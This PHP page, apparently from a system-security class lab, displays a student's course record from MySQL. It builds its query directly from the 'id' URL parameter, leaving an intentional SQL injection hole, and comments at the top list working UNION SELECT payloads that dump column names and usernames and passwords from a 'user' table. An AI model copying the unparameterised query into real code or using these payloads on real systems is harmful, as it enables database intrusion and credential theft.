<?php

include 'koneksi.php';

$id = $_GET['id'];
$sql  = mysqli_query($conn, "SELECT * FROM mhs WHERE id_mhs = {$id}") or die(mysqli_error($conn));

// 999 UNION SELECT 1,2,3,4,5,6,7
// 999 UNION SELECT 1, username, 3, password, 5,6,7 FROM user
// 9999 UNION SELECT 1, group_concat(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema = 'mahasiswa' AND table_name = 'user'
// 999 UNION SELECT 1, group_concat(username), group_concat(password),4,5,6,7 FROM user

// SELECT * FROM mhs WHERE id = 999 UNION SELECT 1, username, password, 4, 5, 6, 7 FROM user
// SELECT TABLE_NAME FROM 'TABLES' WHERE TABLE_SCHEMA = 'mahasiswa'
// 

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keamanan Sistem</title>
</head>
<link href="logo3.png" rel="shortcut icon">
<body style="background-image: url(bg.png) ; "  >
<h2 align="center">Profil Mahasiswa  </h2>
<hr>
<div style="width: 1000px; padding-top: 20px; height: 200px;background-color: gold; margin: auto; border: 2px white solid; border-radius: 1rem; " >

<table width='90%'   border=1 style="margin: auto; " >
    <tr>
        <th><a href='tampil_data.php'>Kembali</a></th>
    </tr>
    <tr>
       <th>NIM</th> <th>NAMA MAHASISWA</th> <th>MATA KULIAH</th> <th>JUMLAH SKS</th> <th>SEMESTER</th> <th>TANGGAL INPUT</th>
    </tr>
    <?php  
    while($user_data = mysqli_fetch_array($sql)) {         
        echo "<tr>";
        echo "<td>".$user_data['nim_mhs']."</td>";
        echo "<td>".$user_data['nama_mhs']."</td>";
        echo "<td>".$user_data['matakuliah_mhs']."</td>";
        echo "<td>".$user_data['jumlahsks_mhs']."</td>";
        echo "<td>".$user_data['semester_mhs']."</td>";
        echo "<td>".$user_data['tglinput_mhs']."</td>";  

                
    }
    ?>
    </table>
    

</div>


    


</body>
</html>